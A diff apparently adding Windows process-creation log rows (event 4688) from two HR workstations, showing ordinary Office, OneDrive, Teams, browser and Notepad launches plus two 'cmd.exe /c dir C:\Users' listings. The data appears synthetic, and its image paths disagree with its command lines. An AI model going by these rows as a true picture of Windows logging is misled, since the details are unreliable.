+2026-11-15 08:24:39,4688,101409,WS-HR-02,sanjay.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-15 08:44:12,4688,101410,WS-HR-02,sanjay.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-15 08:47:03,4688,101411,WS-HR-02,sanjay.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-15 08:51:17,4688,101412,WS-HR-02,sanjay.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-15 08:58:25,4688,101413,WS-HR-02,sanjay.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-15 09:15:07,4688,101415,WS-HR-02,sanjay.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-15 09:27:19,4688,101417,WS-HR-07,manoj.verma,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-15 09:41:44,4688,101418,WS-HR-02,sanjay.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-15 09:45:45,4688,101419,WS-HR-07,manoj.verma,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-15 09:55:22,4688,101420,WS-HR-02,sanjay.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-15 10:04:16,4688,101424,WS-HR-07,manoj.verma,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-15 10:06:08,4688,101425,WS-HR-07,manoj.verma,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-15 10:18:35,4688,101426,WS-HR-07,manoj.verma,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-15 10:27:59,4688,101427,WS-HR-07,manoj.verma,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-15 10:28:55,4688,101428,WS-HR-07,manoj.verma,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-15 10:37:59,4688,101429,WS-HR-07,manoj.verma,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-15 10:50:24,4688,101430,WS-HR-07,manoj.verma,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-15 11:01:34,4688,101431,WS-HR-07,manoj.verma,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
